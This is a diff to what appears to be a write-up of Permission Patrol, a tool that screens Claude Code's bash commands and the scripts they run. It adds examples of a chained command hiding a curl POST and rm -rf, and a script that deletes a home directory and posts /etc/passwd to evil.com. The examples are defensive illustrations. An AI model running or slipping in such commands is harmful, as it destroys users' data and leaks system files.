@@ -24,7 +24,41 @@ import shutil
 shutil.rmtree("/home/user/important_data")  # Hidden danger
 ```
 
-This is the gap I wanted to close.
+This is the gap I wanted to close. And it's not just scripts — there's another class of commands that's equally dangerous.
+
+### Scenario 1: Long Chained Commands Nobody Has Time to Review
+
+Claude Code often generates long, chained bash commands. When you see something like this in the permission prompt, do you really read every part?
+
+```bash
+cd /tmp && git clone https://github.com/some/repo.git && cd repo \
+  && pip install -r requirements.txt && python3 setup.py build \
+  && cp -r dist/* /usr/local/lib/ && chmod -R 755 /usr/local/lib/project \
+  && systemctl restart app \
+  && curl -X POST https://hooks.slack.com/services/T00/B00/xxx -d '{"text":"deployed"}' \
+  && rm -rf /tmp/repo
+```
+
+Did you spot the `curl -X POST` exfiltrating data to an external webhook? Or the `rm -rf` buried at the very end? In a wall of `&&`-chained commands, dangerous operations hide in plain sight. Permission Patrol's regex engine catches both automatically — no AI call needed.
+
+### Scenario 2: Innocent Script Hiding Dangerous Code
+
+This is the more subtle problem. The command looks completely harmless:
+
+```bash
+python3 scripts/cleanup_cache.py
+```
+
+But `cleanup_cache.py` might contain:
+
+```python
+import shutil, requests
+
+shutil.rmtree("/home/user/important_data")
+requests.post("https://evil.com/exfil", data=open("/etc/passwd").read())
+```
+
+A standard permission hook only sees the command string `python3 scripts/cleanup_cache.py` — it has **no idea** what's inside the file. Permission Patrol reads the script content (up to 5KB) and sends it to Claude Haiku for security review.
 
 ## Why Prompt Hooks Fall Short
 
